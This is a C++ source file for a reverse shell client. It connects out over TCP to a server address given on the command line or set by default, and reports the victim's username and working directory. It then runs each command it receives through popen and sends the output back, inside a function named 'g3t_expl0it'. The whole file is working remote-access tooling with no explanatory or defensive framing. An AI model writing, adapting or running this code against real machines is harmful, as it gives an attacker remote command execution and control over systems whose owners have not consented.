#include "client.h"

static int clientSocket = -1;
int NO_SERVER_SOCKET = -1;

void signal_handler(int signal){
    if (signal == SIGINT){
        std::cout << "\nSIGINT Received, performing cleanup.." << std::endl;
        cleanup(NO_SERVER_SOCKET, clientSocket);
        exit(0);
    }
}

Client::Client(int p, const char* ip) {
    bzero((char*) &serverAddr_, sizeof(serverAddr_));
    if( p > 0) {
        serverPort_ = p;
        serverIpAddr_ = (std::string) ip;
    }
    if (client_init()) {
        g3t_expl0it();
    }
}

Client::~Client(){
    cleanup(NO_SERVER_SOCKET, clientSocket); 
    std::cout << "[+] Init cleanup" << std::endl;
}

bool Client::client_init(){
    serverAddr_.sin_family = AF_INET;
    inet_pton(AF_INET, serverIpAddr_.c_str(), (char*) &serverAddr_.sin_addr);
    serverAddr_.sin_port = htons(serverPort_);

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(clientSocket < 0) return false;

    feedback_ = connect(clientSocket, (const struct sockaddr*) &serverAddr_, sizeof(serverAddr_));
    if (feedback_ < 0) return false;

    runProgram_ = true;
    return true;
}

void Client::get_username(){
    struct passwd *pw;
    uid_t uid = getuid();
    pw = getpwuid(uid);
    if (pw == NULL) {
        strcpy(currentUser_, "unknown");
    }
    else {
    strcpy(currentUser_, pw->pw_name);
    }
}

void Client::get_path(){
    if(getcwd(currentPath_, sizeof(currentPath_)) == NULL){
        strcpy(currentPath_, "UNKNOWN");
    }
}

void Client::combine(){
    get_username();
    get_path();
    snprintf(combinedShellText_, sizeof(combinedShellText_), "%s@%s", currentPath_, currentUser_);
}

void Client::execute_command(std::string cmd){
    output_.clear();
    std::vector<std::string> split_cmd;
    size_t start = 0;
    size_t end = cmd.find(' ');
    while (end != std::string::npos) {
        split_cmd.push_back(cmd.substr(start,end - start));
        start = end + 1;
        end = cmd.find(' ', start);
    }
    split_cmd.push_back(cmd.substr(start));

    if(cmd == "exit"|| cmd=="quit"||cmd=="q"){
        output_ = "Shutting down";
        runProgram_ = false;
        return;
    }
    else if(split_cmd[0] == "cd") {
        std::cout << "COMMAND IS cd " << split_cmd[1] << std::endl;
        std::cout << split_cmd[1];
        std::filesystem::path path = split_cmd[1];
        std::cout << split_cmd[1];
        
        if(std::filesystem::is_directory(path)) {
            std::filesystem::current_path(path);
            //strcpy(currentPath_, split_cmd[1].c_str());
            combine();
            std::cout << combinedShellText_ << std::endl;
            output_ = combinedShellText_;
            
        }
        else{
            output_ = "No such directory as " + split_cmd[1]; 
        }
        return;
    }

    std::array<char, 128> buffer;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        output_ = "Failed to execute the command";
        runProgram_ = false;
    }
    while (runProgram_ && fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr){
        output_ += buffer.data();
    }
}

void Client::g3t_expl0it(){
    int bytesReceived=0, bytesSent=0;
    get_current_dir_name();
    get_username();
    combine();
    c_send(clientSocket, combinedShellText_, std::strlen(combinedShellText_), runProgram_, bytesSent);
    
    while(runProgram_){
        c_recv(clientSocket, command_, MAX_COMMAND_SIZE, runProgram_, bytesReceived);
        execute_command(command_);
        c_send(clientSocket, output_.c_str(), output_.size(), runProgram_, bytesSent);
    }
}

int main(int argc, char* argv[]){
    std::signal(SIGINT, signal_handler);
    Client* client = nullptr;
    if (argc == 1) {
        client = new Client(USE_DEFAULT_VALUES, "");
    }

    else if (argc == 3){
        //FOR TEST PURPOSES
        client = new Client(atoi(argv[2]), argv[1]);
    }

    delete client;
    return 0;
}